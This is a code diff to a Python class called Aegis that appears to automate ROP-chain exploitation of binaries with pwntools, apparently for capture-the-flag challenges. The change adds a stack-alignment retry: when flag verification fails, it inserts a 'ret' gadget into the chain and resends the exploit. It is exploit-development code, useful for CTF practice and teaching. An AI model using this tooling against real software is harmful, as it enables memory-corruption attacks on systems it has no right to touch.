@@ -17,6 +17,7 @@ class Aegis:
         """Initiaize important variables for the binary."""
         self.binary = os.path.abspath(binary)
         self.elf = ELF(binary)
+        self.rop = ROP(self.elf)
         if libc is not None:
             self.libc = ELF(libc)
         else:
@@ -124,15 +125,36 @@ class Aegis:
     def exploit(self):
         """Create and run exploit using Against module."""
         aegis_log.info(f"Setting up exploit")
+        chain_len = len(self.against.chain)
+        aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+
         if args.GDB:
             self.against.process = self.against.start("GDB")
             self.against.send_exploit()
+
+            aegis_log.info(f"Adding ret to chain")
+            ret = p64(self.rop.find_gadget(["ret"])[0])
+                
+            chain_len = len(self.against.chain)
+            aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
+
+            self.against.process = self.against.start("GDB")
+            self.against.send_exploit()
+
         else:
             self.against.process = self.against.start("")
             self.against.send_exploit()
-            self.against.recieve_flag()
-            self.against.verify_flag()
+            if self.against.verify_flag() == False:
+                ret = p64(self.rop.find_gadget(["ret"])[0])
+                chain_len = len(self.against.chain)
+                aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+                self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
 
+                self.against.process = self.against.start("")
+                self.against.send_exploit()
+                self.against.verify_flag()
+ 
         
 
 
